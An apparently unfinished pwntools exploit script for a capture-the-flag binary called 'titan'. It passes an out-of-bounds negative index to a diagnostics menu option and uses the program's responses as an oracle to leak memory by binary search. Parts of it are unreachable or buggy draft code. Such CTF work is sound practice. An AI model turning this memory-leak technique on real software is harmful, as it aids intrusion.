#!/usr/bin/env python3

from pwn import *

exe = ELF("./titan")
#libc = ELF("./libc-2.31.so")
#ld = ELF("./ld-2.31.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEB:
            gdb.attach(r, gdbscript="""b *update_config+0x0310
                       b *run_diagnostics+0x0398
                       delete 0
                       delete 1
                       """)
    else:
        r = remote("addr", 1337)

    return r

def update(r, target, target_val , name = b"NONE"):
    r.sendline(b"2")
    r.sendline(target)
    if target != b"0":
        r.sendline(target_val)
    if name == b"NONE":
        r.sendline(b"n")
    else:
        r.sendline(b"y")
        r.sendline(name)

def run_diagnostics(r, val):
    r.sendline(b"3")
    r.recvuntil(b"(0-2): ")
    r.sendline(val)

def leak_address(r, addr_val):
    current_addr = addr_val
    leak = 0
    for j in range(255):
        for i in range(255):
            cur_check = j << 8 | i
            update(r, b"1", str(cur_check).encode())
            run_diagnostics(r, current_addr)
            diagnostics = r.recvuntil(b": ")
            print(f"Trying {hex(cur_check)}")
            print(diagnostics)
            if b"Systems OK!" in diagnostics:
                leak = i
                exit(0)
    return leak

def binary_search_16bit(r, current_addr, low=0, high=0xFFFF):
    while low <= high:
        mid = (low + high) // 2
        update(r, b"1", str(mid).encode())
        update(r, b"2", str(mid).encode())
        run_diagnostics(r, current_addr)
        diagnostics = r.recvuntil(b"WARNING", timeout=5)
        diagnostics = r.recvline()
        print(f"Trying {hex(mid)}")
        #print(diagnostics)
        #r.interactive() 0x9578
        #exit(0)
        if b"Systems OK!" in diagnostics:
            print(f"Found value: {mid} (0x{mid:04x})")
            return mid

        if b"Low values detected!" in diagnostics:
            high = mid - 1
            continue

        if b"High values detected!" in diagnostics:
            low = mid + 1
            continue

        return mid
    return mid


def main():
    r = conn()

    #update(r, b"167", str(0xaaaa).encode(), b"A"*10)
    #run_diagnostics(r, b"161")
    num = -998
    numarr = [0,0,0,0]
    binary_search_16bit(r, str(num).encode())
    r.interactive()
    exit(0)
    for i in range(0,3):
        numarr[i] = binary_search_16bit(r, str(num - i).encode())
    print(numarr[0])
    print(numarr[1])
    print(numarr[2])
    print(numarr[3])
    leak = numarr[0]<<24 | numarr[1]<<16 | numarr[2]<<8 | numarr[3]
    log.success(f"Leaked address: {hex(leak)}")

    r.interactive()


if __name__ == "__main__":
    main()
